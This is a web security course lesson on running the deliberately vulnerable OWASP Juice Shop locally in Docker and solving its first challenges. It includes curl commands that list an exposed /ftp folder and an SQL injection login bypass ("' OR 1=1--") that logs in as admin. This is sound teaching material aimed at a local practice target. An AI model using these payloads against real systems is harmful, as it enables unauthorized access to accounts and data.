---
title: Practice in OWASP Juice Shop and PortSwigger Academy
description: Run OWASP Juice Shop in Docker on your own computer, solve its first challenges with what this module taught, and choose your first free labs in PortSwigger Web Security Academy.
lesson: "12.6"
time: 20 min
sidebar:
  order: 6
---

<!-- lab: run
sudo apt-get install -y -q docker.io curl > /dev/null 2>&1
sudo docker rm -f juice-shop > /dev/null 2>&1
rm -rf ~/websec/juice
-->

A pilot in training crashes the plane dozens of times before the first real flight, and nobody gets hurt, because the plane is a simulator. Web security has simulators too: apps built with flaws on purpose, whose owners want you to break them. In this lesson you start one on your own computer, solve its first three challenges with what lessons 12.2 to 12.5 taught you, and pick the hosted labs to do next.

## Goal

After this lesson you can:

- Run OWASP Juice Shop in Docker so that only your own computer can reach it.
- Find and solve Juice Shop challenges, and check your progress.
- Choose your first labs in PortSwigger Web Security Academy, matched to the lessons of this module.

## Why it matters

Reading about a flaw and finding one are different skills. The second one only grows with practice, and practice on real sites is illegal. Deliberately vulnerable apps give you realistic targets, with flaws that you did not plant yourself, where trying is allowed and expected. Many teams also use them to train new developers and testers.

## The idea

A **deliberately vulnerable application** is an app built with security flaws on purpose, for learning. There are two kinds, and you will use both:

| | Juice Shop (and DVWA) | PortSwigger Web Security Academy |
|---|---|---|
| Where it runs | On your computer, in a container | On PortSwigger's servers |
| What you need | Docker | A browser and a free account |
| Style | One big web shop with more than 100 challenges | Short lessons, each with small labs |
| Good for | Finding flaws without a guide, as in a real test | Learning one flaw type at a time |

**OWASP Juice Shop** is a modern web shop with a hidden **score board**, a page that lists every challenge and marks the ones you have solved. Finding the score board is the first challenge. Each challenge has a difficulty from one to six stars, and the one-star and two-star ones need nothing beyond this module.

The flight simulator analogy has one limit you must respect: a simulator is safe because it is not connected to anything. Juice Shop is a real web server full of real flaws. If you start it so that other machines can reach it, anyone on your network, or on the internet, can break into it, and through its flaws possibly into more. So you start it bound to `127.0.0.1`, as you did with every practice app in this module.

## Try it

This lesson needs Docker. On Ubuntu, in WSL or on a virtual machine, the next step installs it. The course's Codespaces lab has no Docker; there, skip to step 7 and do the PortSwigger part. On macOS, install Docker Desktop from Docker's website, and type the `docker` commands without `sudo`.

### 1. Install Docker

```bash
sudo apt-get install -y docker.io > /dev/null
```

<!-- lab: nocheck -->
```bash
sudo docker --version
```

```output
Docker version 29.1.3, build 29.1.3-0ubuntu3~24.04.2
```

`apt` asks for your password because of `sudo`. You met containers in lesson 5.6: a container is a normal process with its own view of the system. **Docker** is the tool that downloads ready-made container images, the packed files of a container from the same lesson, and runs them. Your version will differ. This lesson uses `sudo` for every `docker` command instead of adding you to the `docker` group, because membership in that group is as powerful as root.

### 2. Download Juice Shop

```bash
sudo docker pull -q bkimminich/juice-shop
```

```output
docker.io/bkimminich/juice-shop:latest
```

`pull` downloads the image, about 120 MB at the time of writing, from Docker Hub, where the Juice Shop project publishes it. `-q` keeps the output to one line. This is the official image named in the OWASP Juice Shop documentation; only run images whose publisher you trust, because an image is a program.

### 3. Start it on your own computer only

<!-- lab: nocheck -->
```bash
sudo docker run -d --name juice-shop -p 127.0.0.1:3000:3000 bkimminich/juice-shop
```

```output
17de3de338f0b5f1f4a9cfbba0cdf03e866941cffe6358b02eed3f24c6ad3bba
```

`run` starts a container from the image. `-d` runs it in the background and prints the container's id, which differs every time. `--name` gives it a name you can type. `-p 127.0.0.1:3000:3000` is the important part: it connects port 3000 of the container to port 3000 of your computer, but only on `127.0.0.1`. Without the address, Docker would open the port on every network your computer is on. And Docker writes its own firewall rules for published ports, which go around ufw from lesson 11.3, so your firewall would not stop it.

<!-- lab: run
until curl -s -o /dev/null http://127.0.0.1:3000/; do sleep 2; done
-->

Juice Shop needs up to a minute to start. Ask for its home page until the answer is 200, not 000:

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:3000/
```

```output
200
```

Now open `http://127.0.0.1:3000/` in your browser and close the welcome box. You see a shop that sells juice. It looks harmless, and that is the point.

### 4. Find the score board

The shop's menu does not link to the score board. But a web app's JavaScript has to know every page it can show, and you can read that JavaScript, as any visitor can:

```bash
curl -s http://127.0.0.1:3000/main.js | grep -o "/score-board" | head -n 1
```

```output
/score-board
```

`main.js` is the shop's main script, named in its home page. Juice Shop uses addresses with `#` in them, so open `http://127.0.0.1:3000/#/score-board` in your browser. A green banner says that you solved a challenge, and the score board lists all the others. This is the "page the menu does not show" from lesson 12.4: hiding a link protects nothing.

### 5. Find a confidential document

Lesson 12.5 showed what a folder with a directory listing gives away. Juice Shop has one. First check the challenge, so that you can see it change:

```bash
mkdir -p ~/websec/juice
cd ~/websec/juice
curl -s "http://127.0.0.1:3000/api/Challenges/?key=directoryListingChallenge" | grep -o '"solved":[a-z]*'
```

```output
"solved":false
```

The score board reads the same data from this API. Now look at the folder, which the shop's "About Us" page links to:

```bash
curl -s http://127.0.0.1:3000/ftp | grep -o 'href="[^"]*"' | head -n 5
```

```output
href="."
href="ftp"
href="ftp/quarantine"
href="ftp/acquisitions.md"
href="ftp/announcement_encrypted.md"
```

```bash
curl -s http://127.0.0.1:3000/ftp/acquisitions.md | head -n 3
curl -s "http://127.0.0.1:3000/api/Challenges/?key=directoryListingChallenge" | grep -o '"solved":[a-z]*'
```

```output
# Planned Acquisitions

> This document is confidential! Do not distribute!
"solved":true
```

A document marked confidential sat in a folder that anyone can list and download. Solved, and in the language of lesson 12.1: A02 Security Misconfiguration, or A01, because nothing checks who may read it.

### 6. Log in as the admin with SQL injection

Juice Shop's login page sends the email and password as JSON. Save two login attempts as files, so the quotes in them do not fight with the shell's quotes:

```json title="quote.json"
{"email": "'", "password": "anything"}
```

```json title="login.json"
{"email": "' OR 1=1--", "password": "anything"}
```

Start with the warning sign from lesson 12.2, a single quote:

```bash
curl -s -o /dev/null -w "%{http_code}\n" -H "Content-Type: application/json" -d @quote.json http://127.0.0.1:3000/rest/user/login
```

```output
500
```

`-d @quote.json` sends the file as the request body, and the `Content-Type` header says it is JSON. A wrong password would give 401. A 500, "Internal Server Error", after one quote means that the quote broke the query on the server. Now the input from step 4 of lesson 12.2:

```bash
curl -s -H "Content-Type: application/json" -d @login.json http://127.0.0.1:3000/rest/user/login | grep -o '"umail":"[^"]*"'
curl -s "http://127.0.0.1:3000/api/Challenges/?key=loginAdminChallenge" | grep -o '"solved":[a-z]*'
```

```output
"umail":"admin@juice-sh.op"
"solved":true
```

The answer holds a login token for the first user in the table, the administrator; `grep` shows only the email that comes with it. The quote closed the email string, `OR 1=1` made the condition true for every user, and `--` removed the password check: the same three pieces as in your `find_notes.py`. The same email typed into the login form in your browser logs you in as the admin.

When you are done, stop and remove the container:

```bash
sudo docker rm -f juice-shop
```

```output
juice-shop
```

`rm -f` stops the container and deletes it, with everything that happened inside it. The image stays, so the next `docker run` starts a fresh shop in seconds, with every challenge unsolved again. Juice Shop has a way to save and restore your progress; the Juice Shop guide in "Go further" explains it.

### 7. Choose your first PortSwigger labs

PortSwigger, the company behind the Burp Suite tool, runs the **Web Security Academy** for free. Create an account at `portswigger.net`, then open a topic. Each topic is a short lesson followed by labs: each lab starts a private, vulnerable site just for you, with a goal such as "log in as the administrator", and marks itself solved when you reach it. Start with the labs marked "Apprentice". At the time of writing, these match this module:

| After lesson | Topic | First labs |
|---|---|---|
| 12.2 Injection | SQL injection | SQL injection vulnerability in WHERE clause allowing retrieval of hidden data; SQL injection vulnerability allowing login bypass |
| 12.3 XSS | Cross-site scripting | Reflected XSS into HTML context with nothing encoded; Stored XSS into HTML context with nothing encoded |
| 12.4 Access control | Access control vulnerabilities | Unprotected admin functionality; User ID controlled by request parameter |
| 12.5 Misconfiguration | Information disclosure | Information disclosure in error messages |

Many guides use Burp Suite, a proxy whose Community Edition is free, that shows and changes the requests your browser sends. You can start without it; the Academy teaches it when you need it.

:::caution[The rules still apply]
Juice Shop and the Academy labs are yours to attack. The real `portswigger.net` site, Docker Hub and every other site around them are not. A lab that "works" on a practice site does not give you permission to try the same thing anywhere else.
:::

## Exercise

Start Juice Shop again, as in step 3. The `/ftp` folder also holds a file called `package.json.bak` (run the listing of step 5 without `head` to see every file), a backup of a file that lists the shop's software and its versions.

1. Try to download it with curl. What status code do you get, and what does the error page say? Use `grep -o '<h2>.*</h2>'` to find the message.
2. Look for the word `stacktrace` in the page. What does the page give away besides the message?
3. Check the challenge with the key `errorHandlingChallenge`.
4. Write two findings for this file, in the format of lesson 12.1.

<details>
<summary>Show the solution</summary>

<!-- lab: run
sudo docker run -d --name juice-shop -p 127.0.0.1:3000:3000 bkimminich/juice-shop > /dev/null
until curl -s -o /dev/null http://127.0.0.1:3000/; do sleep 2; done
-->

```bash
cd ~/websec/juice
curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:3000/ftp/package.json.bak
curl -s http://127.0.0.1:3000/ftp/package.json.bak | grep -o '<h2>.*</h2>'
```

```output
403
<h2><em>403</em> Error: Only .md and .pdf files are allowed!</h2>
```

The server refuses with 403, "Forbidden": it only serves `.md` and `.pdf` files from this folder. So the file is protected, but the refusal is not quiet:

```bash
curl -s http://127.0.0.1:3000/ftp/package.json.bak | grep -o 'at [^<]*fileServer.js[^<]*' | head -n 1
curl -s "http://127.0.0.1:3000/api/Challenges/?key=errorHandlingChallenge" | grep -o '"solved":[a-z]*'
sudo docker rm -f juice-shop
```

```output
at verify (/juice-shop/build/routes/fileServer.js:68:18)
"solved":true
juice-shop
```

The error page carries a full stack trace: the names and paths of the shop's own files, and the line where the check is. In a newer Juice Shop the line numbers can differ. That solved "Error Handling", the same flaw as the debug page in lesson 12.5. Two findings:

```text
A02 Security Misconfiguration: /ftp lists every file, including backups such as package.json.bak
A10 Mishandling of Exceptional Conditions: /ftp/package.json.bak answers 403 with a full stack trace
```

You could also file the stack trace under A02, because sending detailed errors to visitors is a setting. Getting the file itself is a harder Juice Shop challenge; the score board will show you when you are ready for it.

</details>

## Check yourself

**1. Why does the `docker run` command say `-p 127.0.0.1:3000:3000` and not just `-p 3000:3000`?**

<details>
<summary>Answer</summary>

With `127.0.0.1`, only your own computer can reach Juice Shop. Without it, Docker opens the port on every network the computer is on, and anyone on those networks could attack an app that is full of flaws.

</details>

**2. How did you find the score board, which no menu links to?**

<details>
<summary>Answer</summary>

The shop's JavaScript, `main.js`, must know every page the app can show, and any visitor can download it. `grep` found `/score-board` in it. Hiding a link protects nothing.

</details>

**3. A single quote as the email gave 500, and a wrong password gives 401. What does the difference tell you?**

<details>
<summary>Answer</summary>

The 401 is the app saying "wrong login". The 500 means the server itself failed, here because the quote broke the SQL query. A crash on a quote is the warning sign of SQL injection.

</details>

**4. What does `sudo docker rm -f juice-shop` throw away, and what does it keep?**

<details>
<summary>Answer</summary>

It stops and deletes the container, with everything that happened inside it, so the next start is a fresh shop. It keeps the image, so the next start needs no download.

</details>

**5. Juice Shop or PortSwigger Academy: which one is better for learning one flaw type at a time?**

<details>
<summary>Answer</summary>

PortSwigger Academy: each topic is a short lesson followed by small labs about that one flaw. Juice Shop is one big app with many mixed challenges, closer to a real test.

</details>

## Common mistakes

- **Opening Juice Shop to the network.** Leaving out `127.0.0.1` in `-p`, or running it on a cloud server "to share it", puts a vulnerable app online. Keep it on your own machine.
- **Reading the solutions first.** The Juice Shop guide has a full solution for every challenge. Use its hints, and read a solution only after you have tried; the skill is in the searching.
- **Practicing on the real site.** The labs run on their own addresses. The rest of `portswigger.net` and every other site are not targets.
- **Forgetting to stop the container.** Juice Shop keeps using memory in the background until `sudo docker rm -f juice-shop` stops it.
- **Forgetting `sudo`.** `permission denied while trying to connect to the Docker daemon` means that you forgot `sudo`. On WSL, it can also mean that the Docker service is not running; `sudo service docker start` starts it.

## Key terms

- **Deliberately vulnerable application**: an app built with security flaws on purpose, so that people can learn to find and fix them legally.
- **OWASP Juice Shop**: a deliberately vulnerable web shop from OWASP, with over 100 challenges, that you run on your own computer.
- **Score board**: Juice Shop's hidden page that lists every challenge and shows which ones you have solved.
- **Docker**: a tool that downloads container images and runs them as containers.
- **Web Security Academy**: PortSwigger's free online course, with short lessons and hosted labs for each flaw type.

## Go further

- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/): the project page, with the ways to install it and links to everything else.
- [Pwning OWASP Juice Shop](https://pwning.owasp-juice.shop/): the official companion guide, with hints for every challenge and solutions at the end.
- [PortSwigger Web Security Academy: all labs](https://portswigger.net/web-security/all-labs): every lab, grouped by topic and level.
